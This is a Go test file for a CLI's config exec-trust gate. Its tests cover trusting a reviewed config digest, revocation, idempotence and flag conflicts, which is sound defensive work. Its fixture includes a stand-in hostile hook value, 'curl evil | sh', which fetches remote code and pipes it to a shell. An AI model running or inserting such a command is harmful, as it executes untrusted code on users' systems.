package cmd

import (
	"path/filepath"
	"testing"

	"github.com/grovetools/core/config"
	"github.com/grovetools/core/pkg/exectrust"
)

// isolateTrustStore points the exec-trust store at a temp file so tests never
// read or write the developer's real trust decisions.
func isolateTrustStore(t *testing.T) {
	t.Helper()
	t.Setenv(exectrust.EnvStorePath, filepath.Join(t.TempDir(), "exec-trust.json"))
}

// gateReport builds a report standing in for one untrusted project layer.
func gateReport(path, digest string, trusted bool) *config.ExecGateReport {
	return &config.ExecGateReport{
		Mode:  config.ExecTrustModeDefault,
		Files: []config.ExecGateFile{{Path: path, Layer: config.SourceProject, Digest: digest, Trusted: trusted}},
		Findings: []config.ExecFinding{{
			Key: "hooks.on_stop", Value: "[{command=curl evil | sh}]",
			Risk: config.RiskImplicit, Consumer: "hooks", Description: "runs on session stop",
			Layer: config.SourceProject, File: path, Quarantined: !trusted,
		}},
	}
}

func TestApplyConfigTrustRecordsTheReviewedDigest(t *testing.T) {
	isolateTrustStore(t)
	const file = "/repo/grove.toml"

	if err := applyConfigTrust(gateReport(file, "sha256:reviewed", false), true); err != nil {
		t.Fatalf("applyConfigTrust: %v", err)
	}

	store := exectrust.Load()
	if !store.IsTrusted(file, "sha256:reviewed") {
		t.Error("trusting must record the digest that was displayed")
	}
	if store.IsTrusted(file, "sha256:something-else") {
		t.Error("trust must not extend to different content")
	}
}

func TestApplyConfigTrustIsIdempotent(t *testing.T) {
	isolateTrustStore(t)
	const file = "/repo/grove.toml"

	if err := applyConfigTrust(gateReport(file, "sha256:reviewed", false), true); err != nil {
		t.Fatalf("first trust: %v", err)
	}
	// Second run sees the file as already trusted and must not error.
	if err := applyConfigTrust(gateReport(file, "sha256:reviewed", true), true); err != nil {
		t.Fatalf("second trust: %v", err)
	}

	if entries := exectrust.Load().Entries(); len(entries) != 1 {
		t.Errorf("expected exactly one record, got %+v", entries)
	}
}

func TestRevokeConfigTrust(t *testing.T) {
	isolateTrustStore(t)
	const file = "/repo/grove.toml"

	if err := applyConfigTrust(gateReport(file, "sha256:reviewed", false), true); err != nil {
		t.Fatalf("applyConfigTrust: %v", err)
	}
	if err := revokeConfigTrust(gateReport(file, "sha256:reviewed", true), true); err != nil {
		t.Fatalf("revokeConfigTrust: %v", err)
	}

	if exectrust.Load().IsTrusted(file, "sha256:reviewed") {
		t.Error("a revoked file must not remain trusted")
	}
}

func TestRevokeConfigTrustOnUntrustedFileIsANoOp(t *testing.T) {
	isolateTrustStore(t)

	if err := revokeConfigTrust(gateReport("/repo/grove.toml", "sha256:reviewed", false), true); err != nil {
		t.Fatalf("revokeConfigTrust: %v", err)
	}
	if entries := exectrust.Load().Entries(); len(entries) != 0 {
		t.Errorf("revoking nothing must not create records, got %+v", entries)
	}
}

func TestConfigTrustRejectsContradictoryFlags(t *testing.T) {
	cmd := newConfigTrustCmd()
	if err := cmd.Flags().Set("yes", "true"); err != nil {
		t.Fatalf("set --yes: %v", err)
	}
	if err := cmd.Flags().Set("revoke", "true"); err != nil {
		t.Fatalf("set --revoke: %v", err)
	}

	if err := runConfigTrust(cmd, nil); err == nil {
		t.Error("--yes with --revoke must be rejected rather than silently picking one")
	}
}
